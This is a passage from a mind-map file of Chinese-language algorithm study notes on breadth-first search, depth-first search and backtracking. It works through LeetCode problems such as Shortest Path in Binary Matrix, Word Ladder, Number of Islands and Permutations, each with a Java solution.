          0 -&gt; {6,2,1,5}
        </p>
      </li>
    </ul>
    <p>
      第二层：
    </p>
    <ul>
      <li>
        <p>
          6 -&gt; {4}
        </p>
      </li>
      <li>
        <p>
          2 -&gt; {}
        </p>
      </li>
      <li>
        <p>
          1 -&gt; {}
        </p>
      </li>
      <li>
        <p>
          5 -&gt; {3}
        </p>
      </li>
    </ul>
    <p>
      第三层：
    </p>
    <ul>
      <li>
        <p>
          4 -&gt; {}
        </p>
      </li>
      <li>
        <p>
          3 -&gt; {}
        </p>
      </li>
    </ul>
    <p>
      每一层遍历的节点都与根节点距离相同。设 d<sub>i</sub>&#xa0;表示第 i 个节点与根节点的距离，推导出一个结论：对于先遍历的节点 i 与后遍历的节点 j，有 d<sub>i</sub>&#xa0;&lt;= d<sub>j</sub>。利用这个结论，可以求解最短路径等 <strong>最优解</strong>&#xa0;问题：第一次遍历到目的节点，其所经过的路径为最短路径。应该注意的是，使用 BFS 只能求解无权图的最短路径，无权图是指从一个节点到另一个节点的代价都记为 1。
    </p>
    <p>
      在程序实现 BFS 时需要考虑以下问题：
    </p>
    <ul>
      <li>
        <p>
          队列：用来存储每一轮遍历得到的节点；
        </p>
      </li>
      <li>
        <p>
          标记：对于遍历过的节点，应该将它标记，防止重复遍历。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_726472631" CREATED="1754751539616" MODIFIED="1754751539618"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 计算在网格中从原点到特定点的最短路径长度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      1091. Shortest Path in Binary Matrix(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/shortest-path-in-binary-matrix/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/shortest-path-in-binary-matrix/">力扣</a>
    </p>
    <pre><code class="language-plaintext">[[1,1,0,1],
 [1,0,1,0],
 [1,1,1,1],
 [1,0,1,1]]</code></pre>
    <p>
      题目描述：0 表示可以经过某个位置，求解从左上角到右下角的最短路径长度。
    </p>
    <pre><code class="language-plaintext">public int shortestPathBinaryMatrix(int[][] grids) {
        if (grids == null || grids.length == 0 || grids[0].length == 0) {
            return -1;
        }
        int[][] direction = {{1, -1}, {1, 0}, {1, 1}, {0, -1}, {0, 1}, {-1, -1}, {-1, 0}, {-1, 1}};
        int m = grids.length, n = grids[0].length;
        Queue&lt;Pair&lt;Integer, Integer&gt;&gt; queue = new LinkedList&lt;&gt;();
        queue.add(new Pair&lt;&gt;(0, 0));
        int pathLength = 0;
        while (!queue.isEmpty()) {
            int size = queue.size();
            pathLength++;
            while (size-- &gt; 0) {
                Pair&lt;Integer, Integer&gt; cur = queue.poll();
                int cr = cur.getKey(), cc = cur.getValue();
                if (grids[cr][cc] == 1) {
                    continue;
                }
                if (cr == m - 1 &amp;&amp; cc == n - 1) {
                    return pathLength;
                }
                grids[cr][cc] = 1; // 标记
                for (int[] d : direction) {
                    int nr = cr + d[0], nc = cc + d[1];
                    if (nr &lt; 0 || nr &gt;= m || nc &lt; 0 || nc &gt;= n) {
                        continue;
                    }
                    queue.add(new Pair&lt;&gt;(nr, nc));
                }
            }
        }
        return -1;
    }</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1078656925" CREATED="1754751539618" MODIFIED="1754751539620"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 组成整数的最小平方数数量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      279. Perfect Squares (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/perfect-squares/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/perfect-squares/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.</code></pre>
    <p>
      可以将每个整数看成图中的一个节点，如果两个整数之差为一个平方数，那么这两个整数所在的节点就有一条边。
    </p>
    <p>
      要求解最小的平方数数量，就是求解从节点 n 到节点 0 的最短路径。
    </p>
    <p>
      本题也可以用动态规划求解，在之后动态规划部分中会再次出现。
    </p>
    <pre><code class="language-plaintext">public int numSquares(int n) {
    List&lt;Integer&gt; squares = generateSquares(n);
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    boolean[] marked = new boolean[n + 1];
    queue.add(n);
    marked[n] = true;
    int level = 0;
    while (!queue.isEmpty()) {
        int size = queue.size();
        level++;
        while (size-- &gt; 0) {
            int cur = queue.poll();
            for (int s : squares) {
                int next = cur - s;
                if (next &lt; 0) {
                    break;
                }
                if (next == 0) {
                    return level;
                }
                if (marked[next]) {
                    continue;
                }
                marked[next] = true;
                queue.add(next);
            }
        }
    }
    return n;
}
/**
 * 生成小于 n 的平方数序列
 * @return 1,4,9,...
 */
private List&lt;Integer&gt; generateSquares(int n) {
    List&lt;Integer&gt; squares = new ArrayList&lt;&gt;();
    int square = 1;
    int diff = 3;
    while (square &lt;= n) {
        squares.add(square);
        square += diff;
        diff += 2;
    }
    return squares;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1413196928" CREATED="1754751539620" MODIFIED="1754751539623"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 最短单词路径
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      127. Word Ladder (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/word-ladder/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/word-ladder/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
beginWord = &quot;hit&quot;,
endWord = &quot;cog&quot;,
wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]
Output: 5
Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,
return its length 5.</code></pre>
    <pre><code class="language-plaintext">Input:
beginWord = &quot;hit&quot;
endWord = &quot;cog&quot;
wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]
Output: 0
Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation.</code></pre>
    <p>
      题目描述：找出一条从 beginWord 到 endWord 的最短路径，每次移动规定为改变一个字符，并且改变之后的字符串必须在 wordList 中。
    </p>
    <pre><code class="language-plaintext">public int ladderLength(String beginWord, String endWord, List&lt;String&gt; wordList) {
    wordList.add(beginWord);
    int N = wordList.size();
    int start = N - 1;
    int end = 0;
    while (end &lt; N &amp;&amp; !wordList.get(end).equals(endWord)) {
        end++;
    }
    if (end == N) {
        return 0;
    }
    List&lt;Integer&gt;[] graphic = buildGraphic(wordList);
    return getShortestPath(graphic, start, end);
}
private List&lt;Integer&gt;[] buildGraphic(List&lt;String&gt; wordList) {
    int N = wordList.size();
    List&lt;Integer&gt;[] graphic = new List[N];
    for (int i = 0; i &lt; N; i++) {
        graphic[i] = new ArrayList&lt;&gt;();
        for (int j = 0; j &lt; N; j++) {
            if (isConnect(wordList.get(i), wordList.get(j))) {
                graphic[i].add(j);
            }
        }
    }
    return graphic;
}
private boolean isConnect(String s1, String s2) {
    int diffCnt = 0;
    for (int i = 0; i &lt; s1.length() &amp;&amp; diffCnt &lt;= 1; i++) {
        if (s1.charAt(i) != s2.charAt(i)) {
            diffCnt++;
        }
    }
    return diffCnt == 1;
}
private int getShortestPath(List&lt;Integer&gt;[] graphic, int start, int end) {
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    boolean[] marked = new boolean[graphic.length];
    queue.add(start);
    marked[start] = true;
    int path = 1;
    while (!queue.isEmpty()) {
        int size = queue.size();
        path++;
        while (size-- &gt; 0) {
            int cur = queue.poll();
            for (int next : graphic[cur]) {
                if (next == end) {
                    return path;
                }
                if (marked[next]) {
                    continue;
                }
                marked[next] = true;
                queue.add(next);
            }
        }
    }
    return 0;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1850926982" CREATED="1754751539623" MODIFIED="1754751539625"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      DFS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/74dc31eb-6baa-47ea-ab1c-d27a0ca35093.png"/>
      
    </p>
    <p>
      广度优先搜索一层一层遍历，每一层得到的所有新节点，要用队列存储起来以备下一层遍历的时候再遍历。
    </p>
    <p>
      而深度优先搜索在得到一个新节点时立即对新节点进行遍历：从节点 0 出发开始遍历，得到到新节点 6 时，立马对新节点 6 进行遍历，得到新节点 4；如此反复以这种方式遍历新节点，直到没有新节点了，此时返回。返回到根节点 0 的情况是，继续对根节点 0 进行遍历，得到新节点 2，然后继续以上步骤。
    </p>
    <p>
      从一个节点出发，使用 DFS 对一个图进行遍历时，能够遍历到的节点都是从初始节点可达的，DFS 常用来求解这种 <strong>可达性</strong>&#xa0;问题。
    </p>
    <p>
      在程序实现 DFS 时需要考虑以下问题：
    </p>
    <ul>
      <li>
        <p>
          栈：用栈来保存当前节点信息，当遍历新节点返回时能够继续遍历当前节点。可以使用递归栈。
        </p>
      </li>
      <li>
        <p>
          标记：和 BFS 一样同样需要对已经遍历过的节点进行标记。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1262981271" CREATED="1754751539625" MODIFIED="1754751539627"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 查找最大的连通面积
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      695. Max Area of Island (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/max-area-of-island/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/max-area-of-island/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">[[0,0,1,0,0,0,0,1,0,0,0,0,0],
 [0,0,0,0,0,0,0,1,1,1,0,0,0],
 [0,1,1,0,1,0,0,0,0,0,0,0,0],
 [0,1,0,0,1,1,0,0,1,0,1,0,0],
 [0,1,0,0,1,1,0,0,1,1,1,0,0],
 [0,0,0,0,0,0,0,0,0,0,1,0,0],
 [0,0,0,0,0,0,0,1,1,1,0,0,0],
 [0,0,0,0,0,0,0,1,1,0,0,0,0]]</code></pre>
    <pre><code class="language-plaintext">private int m, n;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};
public int maxAreaOfIsland(int[][] grid) {
    if (grid == null || grid.length == 0) {
        return 0;
    }
    m = grid.length;
    n = grid[0].length;
    int maxArea = 0;
    for (int i = 0; i &lt; m; i++) {
        for (int j = 0; j &lt; n; j++) {
            maxArea = Math.max(maxArea, dfs(grid, i, j));
        }
    }
    return maxArea;
}
private int dfs(int[][] grid, int r, int c) {
    if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || grid[r][c] == 0) {
        return 0;
    }
    grid[r][c] = 0;
    int area = 1;
    for (int[] d : direction) {
        area += dfs(grid, r + d[0], c + d[1]);
    }
    return area;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_369333020" CREATED="1754751539627" MODIFIED="1754751539629"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 矩阵中的连通分量数目
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      200. Number of Islands (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/number-of-islands/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/number-of-islands/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
11000
11000
00100
00011
Output: 3</code></pre>
    <p>
      可以将矩阵表示看成一张有向图。
    </p>
    <pre><code class="language-plaintext">private int m, n;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};
public int numIslands(char[][] grid) {
    if (grid == null || grid.length == 0) {
        return 0;
    }
    m = grid.length;
    n = grid[0].length;
    int islandsNum = 0;
    for (int i = 0; i &lt; m; i++) {
        for (int j = 0; j &lt; n; j++) {
            if (grid[i][j] != '0') {
                dfs(grid, i, j);
                islandsNum++;
            }
        }
    }
    return islandsNum;
}
private void dfs(char[][] grid, int i, int j) {
    if (i &lt; 0 || i &gt;= m || j &lt; 0 || j &gt;= n || grid[i][j] == '0') {
        return;
    }
    grid[i][j] = '0';
    for (int[] d : direction) {
        dfs(grid, i + d[0], j + d[1]);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1861742201" CREATED="1754751539629" MODIFIED="1754751539633"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 好友关系的连通分量数目
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      547. Friend Circles (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/friend-circles/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/friend-circles/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
[[1,1,0],
 [1,1,0],
 [0,0,1]]
Output: 2
Explanation:The 0th and 1st students are direct friends, so they are in a friend circle.
The 2nd student himself is in a friend circle. So return 2.</code></pre>
    <p>
      题目描述：好友关系可以看成是一个无向图，例如第 0 个人与第 1 个人是好友，那么 M[0][1] 和 M[1][0] 的值都为 1。
    </p>
    <pre><code class="language-plaintext">private int n;
public int findCircleNum(int[][] M) {
    n = M.length;
    int circleNum = 0;
    boolean[] hasVisited = new boolean[n];
    for (int i = 0; i &lt; n; i++) {
        if (!hasVisited[i]) {
            dfs(M, i, hasVisited);
            circleNum++;
        }
    }
    return circleNum;
}
private void dfs(int[][] M, int i, boolean[] hasVisited) {
    hasVisited[i] = true;
    for (int k = 0; k &lt; n; k++) {
        if (M[i][k] == 1 &amp;&amp; !hasVisited[k]) {
            dfs(M, k, hasVisited);
        }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_582506840" CREATED="1754751539633" MODIFIED="1754751539635"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 填充封闭区域
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      130. Surrounded Regions (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/surrounded-regions/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/surrounded-regions/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example,
X X X X
X O O X
X X O X
X O X X
After running your function, the board should be:
X X X X
X X X X
X X X X
X O X X</code></pre>
    <p>
      题目描述：使被 'X' 包围的 'O' 转换为 'X'。
    </p>
    <p>
      先填充最外侧，剩下的就是里侧了。
    </p>
    <pre><code class="language-plaintext">private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};
private int m, n;
public void solve(char[][] board) {
    if (board == null || board.length == 0) {
        return;
    }
    m = board.length;
    n = board[0].length;
    for (int i = 0; i &lt; m; i++) {
        dfs(board, i, 0);
        dfs(board, i, n - 1);
    }
    for (int i = 0; i &lt; n; i++) {
        dfs(board, 0, i);
        dfs(board, m - 1, i);
    }
    for (int i = 0; i &lt; m; i++) {
        for (int j = 0; j &lt; n; j++) {
            if (board[i][j] == 'T') {
                board[i][j] = 'O';
            } else if (board[i][j] == 'O') {
                board[i][j] = 'X';
            }
        }
    }
}
private void dfs(char[][] board, int r, int c) {
    if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || board[r][c] != 'O') {
        return;
    }
    board[r][c] = 'T';
    for (int[] d : direction) {
        dfs(board, r + d[0], c + d[1]);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_637245077" CREATED="1754751539636" MODIFIED="1754751539638"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 能到达的太平洋和大西洋的区域
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      417. Pacific Atlantic Water Flow (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/pacific-atlantic-water-flow/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/pacific-atlantic-water-flow/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Given the following 5x5 matrix:
  Pacific ~   ~   ~   ~   ~
       ~  1   2   2   3  (5) *
       ~  3   2   3  (4) (4) *
       ~  2   4  (5)  3   1  *
       ~ (6) (7)  1   4   5  *
       ~ (5)  1   1   2   4  *
          *   *   *   *   * Atlantic
Return:
[[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]] (positions with parentheses in above matrix).</code></pre>
    <p>
      左边和上边是太平洋，右边和下边是大西洋，内部的数字代表海拔，海拔高的地方的水能够流到低的地方，求解水能够流到太平洋和大西洋的所有位置。
    </p>
    <pre><code class="language-plaintext">private int m, n;
private int[][] matrix;
private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};
public List&lt;List&lt;Integer&gt;&gt; pacificAtlantic(int[][] matrix) {
    List&lt;List&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();
    if (matrix == null || matrix.length == 0) {
        return ret;
    }
    m = matrix.length;
    n = matrix[0].length;
    this.matrix = matrix;
    boolean[][] canReachP = new boolean[m][n];
    boolean[][] canReachA = new boolean[m][n];
    for (int i = 0; i &lt; m; i++) {
        dfs(i, 0, canReachP);
        dfs(i, n - 1, canReachA);
    }
    for (int i = 0; i &lt; n; i++) {
        dfs(0, i, canReachP);
        dfs(m - 1, i, canReachA);
    }
    for (int i = 0; i &lt; m; i++) {
        for (int j = 0; j &lt; n; j++) {
            if (canReachP[i][j] &amp;&amp; canReachA[i][j]) {
                ret.add(Arrays.asList(i, j));
            }
        }
    }
    return ret;
}
private void dfs(int r, int c, boolean[][] canReach) {
    if (canReach[r][c]) {
        return;
    }
    canReach[r][c] = true;
    for (int[] d : direction) {
        int nextR = d[0] + r;
        int nextC = d[1] + c;
        if (nextR &lt; 0 || nextR &gt;= m || nextC &lt; 0 || nextC &gt;= n
                || matrix[r][c] &gt; matrix[nextR][nextC]) {
            continue;
        }
        dfs(nextR, nextC, canReach);
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1019327024" CREATED="1754751539639" MODIFIED="1754751539641"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Backtracking
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      Backtracking（回溯）属于 DFS。
    </p>
    <ul>
      <li>
        <p>
          普通 DFS 主要用在 <strong>可达性问题</strong>&#xa0;，这种问题只需要执行到特点的位置然后返回即可。
        </p>
      </li>
      <li>
        <p>
          而 Backtracking 主要用于求解 <strong>排列组合</strong>&#xa0;问题，例如有 { 'a','b','c' } 三个字符，求解所有由这三个字符排列得到的字符串，这种问题在执行到特定的位置返回之后还会继续执行求解过程。
        </p>
      </li>
    </ul>
    <p>
      因为 Backtracking 不是立即返回，而要继续求解，因此在程序实现时，需要注意对元素的标记问题：
    </p>
    <ul>
      <li>
        <p>
          在访问一个新元素进入新的递归调用时，需要将新元素标记为已经访问，这样才能在继续递归调用时不用重复访问该元素；
        </p>
      </li>
      <li>
        <p>
          但是在递归返回时，需要将元素标记为未访问，因为只需要保证在一个递归链中不同时访问一个元素，可以访问已经访问过但是不在当前递归链中的元素。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1999145180" CREATED="1754751539641" MODIFIED="1754751539643"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数字键盘组合
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      17. Letter Combinations of a Phone Number (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/letter-combinations-of-a-phone-number/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/description/">力扣</a>
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9823768c-212b-4b1a-b69a-b3f59e07b977.jpg"/>
      
    </p>
    <pre><code class="language-plaintext">Input:Digit string &quot;23&quot;
Output: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].</code></pre>
    <pre><code class="language-plaintext">private static final String[] KEYS = {&quot;&quot;, &quot;&quot;, &quot;abc&quot;, &quot;def&quot;, &quot;ghi&quot;, &quot;jkl&quot;, &quot;mno&quot;, &quot;pqrs&quot;, &quot;tuv&quot;, &quot;wxyz&quot;};
public List&lt;String&gt; letterCombinations(String digits) {
    List&lt;String&gt; combinations = new ArrayList&lt;&gt;();
    if (digits == null || digits.length() == 0) {
        return combinations;
    }
    doCombination(new StringBuilder(), combinations, digits);
    return combinations;
}
private void doCombination(StringBuilder prefix, List&lt;String&gt; combinations, final String digits) {
    if (prefix.length() == digits.length()) {
        combinations.add(prefix.toString());
        return;
    }
    int curDigits = digits.charAt(prefix.length()) - '0';
    String letters = KEYS[curDigits];
    for (char c : letters.toCharArray()) {
        prefix.append(c);                         // 添加
        doCombination(prefix, combinations, digits);
        prefix.deleteCharAt(prefix.length() - 1); // 删除
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_140393938" CREATED="1754751539643" MODIFIED="1754751539645"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. IP 地址划分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      93. Restore IP Addresses(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/restore-ip-addresses/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/restore-ip-addresses/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Given &quot;25525511135&quot;,
return [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;].</code></pre>
    <pre><code class="language-plaintext">public List&lt;String&gt; restoreIpAddresses(String s) {
    List&lt;String&gt; addresses = new ArrayList&lt;&gt;();
    StringBuilder tempAddress = new StringBuilder();
    doRestore(0, tempAddress, addresses, s);
    return addresses;
}
private void doRestore(int k, StringBuilder tempAddress, List&lt;String&gt; addresses, String s) {
    if (k == 4 || s.length() == 0) {
        if (k == 4 &amp;&amp; s.length() == 0) {
            addresses.add(tempAddress.toString());
        }
        return;
    }
    for (int i = 0; i &lt; s.length() &amp;&amp; i &lt;= 2; i++) {
        if (i != 0 &amp;&amp; s.charAt(0) == '0') {
            break;
        }
        String part = s.substring(0, i + 1);
        if (Integer.valueOf(part) &lt;= 255) {
            if (tempAddress.length() != 0) {
                part = &quot;.&quot; + part;
            }
            tempAddress.append(part);
            doRestore(k + 1, tempAddress, addresses, s.substring(i + 1));
            tempAddress.delete(tempAddress.length() - part.length(), tempAddress.length());
        }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_381235953" CREATED="1754751539645" MODIFIED="1754751539647"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 在矩阵中寻找字符串
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      79. Word Search (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/word-search/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/word-search/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example,
Given board =
[
  ['A','B','C','E'],
  ['S','F','C','S'],
  ['A','D','E','E']
]
word = &quot;ABCCED&quot;, -&gt; returns true,
word = &quot;SEE&quot;, -&gt; returns true,
word = &quot;ABCB&quot;, -&gt; returns false.</code></pre>
    <pre><code class="language-plaintext">private final static int[][] direction = {{1, 0}, {-1, 0}, {0, 1}, {0, -1}};
private int m;
private int n;
public boolean exist(char[][] board, String word) {
    if (word == null || word.length() == 0) {
        return true;
    }
    if (board == null || board.length == 0 || board[0].length == 0) {
        return false;
    }
    m = board.length;
    n = board[0].length;
    boolean[][] hasVisited = new boolean[m][n];
    for (int r = 0; r &lt; m; r++) {
        for (int c = 0; c &lt; n; c++) {
            if (backtracking(0, r, c, hasVisited, board, word)) {
                return true;
            }
        }
    }
    return false;
}
private boolean backtracking(int curLen, int r, int c, boolean[][] visited, final char[][] board, final String word) {
    if (curLen == word.length()) {
        return true;
    }
    if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n
            || board[r][c] != word.charAt(curLen) || visited[r][c]) {
        return false;
    }
    visited[r][c] = true;
    for (int[] d : direction) {
        if (backtracking(curLen + 1, r + d[0], c + d[1], visited, board, word)) {
            return true;
        }
    }
    visited[r][c] = false;
    return false;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1907229" CREATED="1754751539648" MODIFIED="1754751539649"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 输出二叉树中所有从根到叶子的路径
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      257. Binary Tree Paths (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/binary-tree-paths/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/binary-tree-paths/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">1
 /  \
2    3
 \
  5</code></pre>
    <pre><code class="language-plaintext">[&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]</code></pre>
    <pre><code class="language-plaintext">public List&lt;String&gt; binaryTreePaths(TreeNode root) {
    List&lt;String&gt; paths = new ArrayList&lt;&gt;();
    if (root == null) {
        return paths;
    }
    List&lt;Integer&gt; values = new ArrayList&lt;&gt;();
    backtracking(root, values, paths);
    return paths;
}
private void backtracking(TreeNode node, List&lt;Integer&gt; values, List&lt;String&gt; paths) {
    if (node == null) {
        return;
    }
    values.add(node.val);
    if (isLeaf(node)) {
        paths.add(buildPath(values));
    } else {
        backtracking(node.left, values, paths);
        backtracking(node.right, values, paths);
    }
    values.remove(values.size() - 1);
}
private boolean isLeaf(TreeNode node) {
    return node.left == null &amp;&amp; node.right == null;
}
private String buildPath(List&lt;Integer&gt; values) {
    StringBuilder str = new StringBuilder();
    for (int i = 0; i &lt; values.size(); i++) {
        str.append(values.get(i));
        if (i != values.size() - 1) {
            str.append(&quot;-&gt;&quot;);
        }
    }
    return str.toString();
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_345410611" CREATED="1754751539650" MODIFIED="1754751539652"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 排列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      46. Permutations (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/permutations/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/permutations/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">[1,2,3] have the following permutations:
[
  [1,2,3],
  [1,3,2],
  [2,1,3],
  [2,3,1],
  [3,1,2],
  [3,2,1]
]</code></pre>
    <pre><code class="language-plaintext">public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;();
    List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;();
    boolean[] hasVisited = new boolean[nums.length];
    backtracking(permuteList, permutes, hasVisited, nums);
    return permutes;
}
private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) {
    if (permuteList.size() == nums.length) {
        permutes.add(new ArrayList&lt;&gt;(permuteList)); // 重新构造一个 List
        return;
    }
    for (int i = 0; i &lt; visited.length; i++) {
        if (visited[i]) {
            continue;
        }
        visited[i] = true;
        permuteList.add(nums[i]);
        backtracking(permuteList, permutes, visited, nums);
        permuteList.remove(permuteList.size() - 1);
        visited[i] = false;
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_577738518" CREATED="1754751539652" MODIFIED="1754751539655"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 含有相同元素求排列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      47. Permutations II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/permutations-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/permutations-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">[1,1,2] have the following unique permutations:
[[1,1,2], [1,2,1], [2,1,1]]</code></pre>
    <p>
